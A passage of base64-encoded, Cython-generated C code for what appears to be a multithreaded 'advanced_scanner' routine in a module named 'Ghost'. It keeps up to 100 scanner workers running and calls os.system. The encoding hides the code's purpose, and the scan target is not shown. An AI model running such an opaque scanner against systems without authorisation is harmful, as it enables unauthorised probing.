DAsIDQzOCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYXhfd29ya2VycywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMCwgX19weXhfdF8zLCBfX3B5eF9jYWxsYXJncysxLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzOCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8zKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQzOCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgfQogICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDM4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19weXhfdF8zID0gTlVMTDsKICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0wzX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzUgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzUgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIE5VTEx9OwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQzOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgfQogICAgX19weXhfdF80ID0gX19weXhfdF8yOwogICAgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgIHsKICAgICAgewogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF83LCAmX19weXhfdF84LCAmX19weXhfdF85KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTsKICAgICAgICAgewogICAgICAgICAgX19weXhfdl9leGVjdXRvciA9IF9fcHl4X3RfNDsKICAgICAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDdfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgIF9fcHl4X3ZfZnV0dXJlX3RvX3dvcmtlciA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNCk7CiAgICAgICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKTsKICAgICAgICAgIF9fcHl4X3Zfd29ya2VyX2lkID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzA7CgogICAgICAgICAgCiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEwLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTIpOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgewoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICB3aGlsZSAoMSkgewogICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW5uaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQzLCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDQzLCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgICAgIGlmICghX19weXhfdF8xMykgYnJlYWs7CgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSBOVUxMOwogICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fc3VtKTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fc3VtOyAKCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIF9fcHl4X3RfMyA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfMTZhZHZhbmNlZF9zY2FubmVyX2dlbmV4cHIoTlVMTCwgX19weXhfdl9mdXR1cmVfdG9fd29ya2VyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDQ1LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDE7CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEsIF9fcHl4X3RfM307CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ0NCwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfYWN0aXZlX3dvcmtlcnMsIF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmOwogICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF92X2FjdGl2ZV93b3JrZXJzfTsKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9hY3RpdmVfdGhyZWFkcywgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQ2LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSAoMSkgewogICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X2FjdGl2ZV93b3JrZXJzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQ4LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDQ4LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgICBpZiAoIV9fcHl4X3RfMTMpIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3ZfZXhlY3V0b3I7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwoKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2Nhbm5lcl93b3JrZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0NTAsIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8yLCBfX3B5eF90XzMsIF9fcHl4X3Zfd29ya2VyX2lkfTsKICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3VibWl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgzLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDQ5LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9mdXR1cmUsIF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KChQeURpY3RfU2V0SXRlbShfX3B5eF92X2Z1dHVyZV90b193b3JrZXIsIF9fcHl4X3Zfd29ya2VyX2lkLCBfX3B5eF92X2Z1dHVyZSkgPCAwKSkpIF9fUFlYX0VSUigwLCA0NTEsIF9fcHl4X0wxM19lcnJvcikKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF92X3dvcmtlcl9pZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NTIsIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl93b3JrZXJfaWQsIF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdl9hY3RpdmVfd29ya2VycywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NTMsIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9hY3RpdmVfd29ya2VycywgX19weXhfdF80KTsKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBfX3B5eF90XzMgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzMpOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgX19weXhfdl9hY3RpdmVfd29ya2Vyc307CiAgICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9hY3RpdmVfdGhyZWFkcywgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gUHlEaWN0X05ldygpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NTYsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CgogICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgX19weXhfdF8xNCA9IDA7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X2RpY3RfaXRlcmF0b3IoX19weXhfdl9mdXR1cmVfdG9fd29ya2VyLCAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaXRlbXMsICgmX19weXhfdF8xNSksICgmX19weXhfdF8xNikpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTcsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8zID0gX19weXhfdF8yOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICAgICAgICB3aGlsZSAoMSkgewogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9kaWN0X2l0ZXJfbmV4dChfX3B5eF90XzMsIF9fcHl4X3RfMTUsICZfX3B5eF90XzE0LCAmX19weXhfdF8yLCAmX19weXhfdF8xLCBOVUxMLCBfX3B5eF90XzE2KTsKICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8xNyA9PSAwKSkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTcgPT0gLTEpKSBfX1BZWF9FUlIoMCwgNDU3LCBfX3B5eF9MMjVfZXJyb3IpCiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfOGdlbmV4cHI0X19weXhfdl93aWQsIF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSwgX19weXhfdF8xKTsKICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fcHl4XzhnZW5leHByNF9fcHl4X3ZfZnV0dXJlOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07CiAgICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9uZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0NTcsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMyA8IDApKSkgX19QWVhfRVJSKDAsIDQ1NywgX19weXhfTDI1X2Vycm9yKQogICAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTggPSAoIV9fcHl4X3RfMTMpOwogICAgICAgICAgICAgICAgICAgIGlmIChfX3B5eF90XzE4KSB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCAoUHlPYmplY3QqKV9fcHl4XzhnZW5leHByNF9fcHl4X3Zfd2lkLCAoUHlPYmplY3QqKV9fcHl4XzhnZW5leHByNF9fcHl4X3ZfZnV0dXJlKSkpIF9fUFlYX0VSUigwLCA0NTcsIF9fcHl4X0wyNV9lcnJvcikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmUpOyBfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl93aWQpOyBfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCA9IDA7CiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDI5X2V4aXRfc2NvcGU7CiAgICAgICAgICAgICAgICAgIF9fcHl4X0wyNV9lcnJvcjo7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmUpOyBfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfOGdlbmV4cHI0X19weXhfdl93aWQpOyBfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCA9IDA7CiAgICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDEzX2Vycm9yOwogICAgICAgICAgICAgICAgICBfX3B5eF9MMjlfZXhpdF9zY29wZTo7CiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2Z1dHVyZV90b193b3JrZXIsICgoUHlPYmplY3QqKV9fcHl4X3RfNCkpOwogICAgICAgICAgICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIF9fcHl4X3RfMyA9IE5VTEw7CiAgICAgICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDU5LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDU5LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgNDU5LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICAgICAgICBfX3B5eF90XzIwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzE5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMCkpIF9fUFlYX0VSUigwLCA0NTksIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIwKTsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICAgICAgICBfX3B5eF90XzE4ID0gKF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoX19weXhfdF8yMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X250LCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTggPCAwKSkpIF9fUFlYX0VSUigwLCA0N